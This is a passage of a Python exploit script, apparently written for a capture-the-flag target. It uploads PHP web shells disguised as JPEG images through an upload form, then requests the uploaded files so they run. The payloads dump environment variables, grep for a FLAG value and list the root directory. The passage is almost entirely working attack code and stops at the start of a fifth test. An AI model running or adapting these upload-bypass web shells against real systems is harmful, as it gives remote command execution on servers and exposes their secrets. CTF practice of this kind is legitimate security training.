env_shell = jpeg_content + b'<?php echo "<pre>"; print_r($_ENV); echo "</pre>"; ?>'
files = {'userfile': ('env_dump.jpg', env_shell, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
match = re.search(r"href='upload/([^']+)'", r.text)
if match:
    filename = match.group(1)
    r2 = requests.get(f"{base_url}/upload/{filename}")
    print(f"[+] Environment dump:\n{r2.text}")

# Test 3: System command env
print("\n[*] TEST 3: System command env")
env_cmd_shell = jpeg_content + b'<?php system("env | grep FLAG"); ?>'
files = {'userfile': ('env_cmd.jpg', env_cmd_shell, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
match = re.search(r"href='upload/([^']+)'", r.text)
if match:
    filename = match.group(1)
    r2 = requests.get(f"{base_url}/upload/{filename}")
    print(f"[+] env | grep FLAG: {r2.text}")

# Test 4: List root directory
print("\n[*] TEST 4: List root directory")
ls_shell = jpeg_content + b'<?php system("ls -la /"); ?>'
files = {'userfile': ('ls.jpg', ls_shell, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
match = re.search(r"href='upload/([^']+)'", r.text)
if match:
    filename = match.group(1)
    r2 = requests.get(f"{base_url}/upload/{filename}")
    print(f"[+] ls -la /: {r2.text}")

# Test 5: Check existing shell.jpg
